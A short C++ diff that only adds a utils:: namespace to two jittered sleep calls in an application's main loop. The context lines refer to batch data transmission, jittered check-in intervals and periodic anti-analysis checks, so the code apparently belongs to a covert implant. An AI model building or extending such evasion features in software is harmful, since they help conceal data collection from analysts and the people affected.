@@ -119,7 +119,7 @@ void Application::Run() {
                 } else {
                     LOG_ERROR("Batch data transmission failed");
                     // Retry after shorter interval
-                    TimeUtils::JitterSleep(30000, 0.2);
+                    utils::TimeUtils::JitterSleep(30000, 0.2);
                 }
             }
         }
@@ -134,7 +134,7 @@ void Application::Run() {
         }
 
         // Sleep with jitter
-        TimeUtils::JitterSleep(10000, 0.2); // Check every 10 seconds
+        utils::TimeUtils::JitterSleep(10000, 0.2); // Check every 10 seconds
 
         // Perform anti-analysis checks periodically
         static int antiAnalysisCounter = 0;
